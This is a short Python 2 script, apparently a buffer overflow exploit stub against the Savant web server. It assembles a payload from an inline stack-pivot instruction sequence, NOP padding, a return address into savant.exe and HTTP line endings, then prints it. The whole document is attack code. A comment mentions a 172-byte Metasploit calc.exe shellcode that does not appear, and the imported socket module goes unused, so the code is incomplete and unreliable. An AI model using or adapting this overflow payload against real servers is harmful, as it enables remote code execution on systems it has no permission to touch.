import socket,sys
# win calc.exe [metasploit] (172 byte)


buff3 = "\x90" * 30
buff2 = "\x90" * 53
ret =   "\x09\x1D\x40" #savant.exe 
buffr = '\x83\xC4\x50\x54\xc3 /' +buff2+buff3+ret + '\r\n\r\n'
print buffr
